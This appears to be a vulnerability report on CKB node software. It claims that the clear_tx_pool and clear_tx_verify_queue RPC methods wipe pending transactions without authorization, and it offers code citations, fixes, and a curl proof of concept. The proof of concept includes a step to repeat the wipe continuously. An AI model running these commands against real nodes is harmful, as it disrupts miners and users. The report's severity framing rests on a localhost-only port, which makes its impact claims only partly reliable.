### Title
Any Local RPC Caller Can Invoke `clear_tx_pool` and `clear_tx_verify_queue` to Wipe Pending Transactions Without Authorization — (`rpc/src/module/pool.rs`)

---

### Summary

The `clear_tx_pool` and `clear_tx_verify_queue` RPC methods in the production-enabled `Pool` module carry no authentication or authorization check. Any process with access to the RPC port (localhost by default) can call them, completely wiping all pending transactions and the verification queue. This is the direct CKB analog of the BakerFi `harvest()` vulnerability: an unprivileged caller can invoke a state-mutating function that should be operator-restricted, disrupting the fee-collection mechanism and causing miners to lose all pending transaction fees.

---

### Finding Description

**Root cause — missing access control on state-mutating RPC methods**

`clear_tx_pool` and `clear_tx_verify_queue` are declared in the `PoolRpc` trait and implemented in `PoolRpcImpl` with zero caller verification:

```rust
// rpc/src/module/pool.rs  line 684
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}

// line 694
fn clear_tx_verify_queue(&self) -> Result<()> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_verify_queue()
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
``` [1](#0-0) 

Both methods are part of the `Pool` module, which is **enabled by default** in the production configuration:

```toml
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]
``` [2](#0-1) 

**Call chain — no privilege check at any layer**

1. RPC handler calls `tx_pool.clear_pool(snapshot)` (no auth check).
2. This sends `Message::ClearPool` to the tx-pool service.
3. The service handler at `tx-pool/src/service.rs:972` calls `service.clear_pool(new_snapshot).await`.
4. `clear_pool` in `tx-pool/src/process.rs:916` acquires a write lock and calls `tx_pool.clear(...)`, then resets the block assembler. [3](#0-2) [4](#0-3) 

No step in this chain checks the identity or privilege of the caller.

**Attacker-controlled entry path**

The RPC listens on `127.0.0.1:8114` by default. Any process running on the same host — a co-located application, a malicious script, or a compromised dependency — can issue:

```bash
curl -X POST http://127.0.0.1:8114 \
  -H "Content-Type: application/json" \
  -d '{"id":1,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
```

No credentials, no token, no signature required.

---

### Impact Explanation

- **Miners lose all pending transaction fees.** Every transaction in the pool — including high-fee ones — is silently dropped. The miner's next block template is built from an empty pool, yielding only the coinbase reward.
- **Users' transactions are evicted** and must be resubmitted, potentially at higher fee rates if the pool refills with competing transactions.
- **`clear_tx_verify_queue`** additionally drops all transactions currently being verified, stalling the pipeline and compounding the disruption.
- The attack is repeatable: the caller can poll and clear the pool continuously, keeping it perpetually empty and denying miners any fee revenue beyond the base block subsidy.

This is a direct financial impact on miners (loss of transaction fees) and a service-availability impact on users (forced resubmission), matching the vulnerability class of the reference report.

---

### Likelihood Explanation

- The `Pool` module is on by default; no special configuration is needed.
- The RPC port is unauthenticated; no credentials exist to steal or guess.
- Any co-located process (monitoring agent, wallet daemon, compromised library) qualifies as the attacker.
- The exploit is a single HTTP POST — trivially scriptable and repeatable.

---

### Recommendation

1. **Restrict destructive pool operations** (`clear_tx_pool`, `clear_tx_verify_queue`, `remove_transaction`) behind an operator-only authentication layer (e.g., a shared secret token in the request header, or a separate privileged RPC socket).
2. Alternatively, move these methods out of the default `Pool` module into a separate `Admin` or `Operator` module that is **disabled by default** and requires explicit opt-in with documented security warnings — analogous to how `IntegrationTest` methods (`truncate`, `process_block_without_verify`) are already gated behind a non-default module.
3. At minimum, add a configurable allowlist of caller IPs/tokens so node operators can restrict who may invoke state-mutating pool operations.

---

### Proof of Concept

```bash
# Step 1: Submit several transactions to the pool (normal user flow)
curl -X POST http://127.0.0.1:8114 -H "Content-Type: application/json" \
  -d '{"id":1,"jsonrpc":"2.0","method":"tx_pool_info","params":[]}'
# => pending: "0x5", total_tx_size: "0x...", etc.

# Step 2: Any local process wipes the pool — no credentials needed
curl -X POST http://127.0.0.1:8114 -H "Content-Type: application/json" \
  -d '{"id":2,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
# => {"result": null}

# Step 3: Pool is now empty; miner's next block earns zero tx fees
curl -X POST http://127.0.0.1:8114 -H "Content-Type: application/json" \
  -d '{"id":3,"jsonrpc":"2.0","method":"tx_pool_info","params":[]}'
# => pending: "0x0", total_tx_size: "0x0"

# Repeat step 2 continuously to keep the pool perpetually empty.
```

The same attack applies to `clear_tx_verify_queue`, which additionally stalls in-flight transaction verification.

### Citations

**File:** rpc/src/module/pool.rs (L684-701)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }

    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** resource/ckb.toml (L190-193)
```text
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```

**File:** tx-pool/src/service.rs (L972-980)
```rust
        Message::ClearPool(Request {
            responder,
            arguments: new_snapshot,
        }) => {
            service.clear_pool(new_snapshot).await;
            if let Err(e) = responder.send(()) {
                error!("Responder sending clear_pool failed {:?}", e)
            };
        }
```

**File:** tx-pool/src/process.rs (L916-930)
```rust
    pub(crate) async fn clear_pool(&mut self, new_snapshot: Arc<Snapshot>) {
        {
            let mut tx_pool = self.tx_pool.write().await;
            tx_pool.clear(Arc::clone(&new_snapshot));
        }
        // reset block_assembler
        if self
            .block_assembler_sender
            .send(BlockAssemblerMessage::Reset(new_snapshot))
            .await
            .is_err()
        {
            error!("block_assembler receiver dropped");
        }
    }
```
